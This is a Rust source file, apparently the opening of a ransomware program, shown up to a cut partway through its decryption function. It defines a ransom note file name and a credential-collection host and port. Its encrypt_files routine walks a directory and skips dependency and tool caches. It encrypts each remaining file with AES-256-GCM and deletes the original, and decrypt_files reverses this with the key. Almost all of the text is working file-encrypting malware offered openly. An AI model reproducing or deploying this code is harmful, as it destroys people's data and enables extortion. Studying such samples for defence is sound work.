use aes_gcm::aead::{Aead, NewAead};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use base64;
use dirs;
use rand;
use std::env;
use std::fs;
use std::io::Write;
use std::net::TcpStream;
use std::path::PathBuf;
use std::{thread, time};
use walkdir::{DirEntry, WalkDir};

static RANSOMWARE_EXT: &str = "enc";
static RANSOM_NOTE_FILENAME: &str = "RANSOM_NOTE.txt";
// Address where we collect credentials
static HOST: &str = "127.0.0.1";
static PORT: usize = 8080;

fn is_ignored(entry: &DirEntry) -> bool {
    let file_name = entry.file_name();
    entry.path().is_dir()
        && (file_name == "node_modules"
            || file_name == "vendor"
            || file_name == "site-packages"
            || file_name == ".cargo"
            || file_name == ".rustup"
            || file_name == ".heroku"
            || file_name == ".node-gyp"
            || file_name == ".npm"
            || file_name == ".yjp" // jetbrains ide
            || file_name == ".ivy2" // maven cache
            || file_name == ".m2"
            || file_name == ".vscode"
            || file_name == ".git"
            || file_name == ".pub-cache" // dart
            || file_name == ".gradle")
}

fn encrypt_files(target_dir: PathBuf, key: &str) {
    let key = Key::from_slice(key.as_bytes());
    let cipher = Aes256Gcm::new(key);
    let walker = WalkDir::new(target_dir).into_iter().filter_entry(|e| !is_ignored(e));
    for entry in walker {
        let dir_entry = match entry {
            Err(_) => continue,
            Ok(dir_entry) => dir_entry,
        };
        if dir_entry.path().is_symlink() {
            continue;
        }
        if dir_entry.path().is_dir() {
            continue;
        }
        if dir_entry.path().extension().unwrap_or_default() == RANSOMWARE_EXT {
            continue;
        }
        if dir_entry.file_name() == RANSOM_NOTE_FILENAME {
            continue;
        }

        let path = dir_entry.path();
        let random_bytes: Vec<u8> = (0..12).map(|_| rand::random::<u8>()).collect();
        let nonce_slice = random_bytes.as_slice();
        let nonce = Nonce::from_slice(nonce_slice);
        let content = fs::read(path).unwrap();
        let ciphertext = cipher.encrypt(nonce, content.as_ref()).unwrap();
        let mut ciphertext_with_nonce = ciphertext;
        ciphertext_with_nonce.extend_from_slice(nonce_slice);
        let orig_ext = path
            .extension()
            .unwrap_or_default()
            .to_str()
            .unwrap_or_default();
        let mut new_ext = String::new();
        if orig_ext != "" {
            new_ext = format!(".{}", orig_ext);
        }
        new_ext += &RANSOMWARE_EXT;
        let new_filepath = path.with_extension(new_ext);
        fs::write(new_filepath, ciphertext_with_nonce).unwrap();
        fs::remove_file(path).unwrap();
    }
}

fn decrypt_files(target_dir: PathBuf, decryption_key: &str) {
    let key_bytes = decryption_key.as_bytes();
    if key_bytes.len() != 32 {
        println!("invalid key length");
        return;
    }
    let key = Key::from_slice(key_bytes);
    let cipher = Aes256Gcm::new(key);
    for entry in WalkDir::new(target_dir) {
        let dir_entry = match entry {
            Err(_) => continue,
            Ok(dir_entry) => dir_entry,
        };
        let orig_path = dir_entry.path();
        if orig_path.extension().unwrap_or_default() != RANSOMWARE_EXT {
            continue;
        }
        let encrypted_content = fs::read(orig_path).unwrap();
        let nonce_raw = encrypted_content.as_slice()[encrypted_content.len() - 12..].as_ref();
        let content = encrypted_content.as_slice()[..encrypted_content.len() - 12].as_ref();
        let nonce = Nonce::from_slice(nonce_raw);
        let plaintext = cipher
            .decrypt(nonce, content)
            .expect("invalid decryption key");
        let new_path = orig_path.with_file_name(orig_path.file_
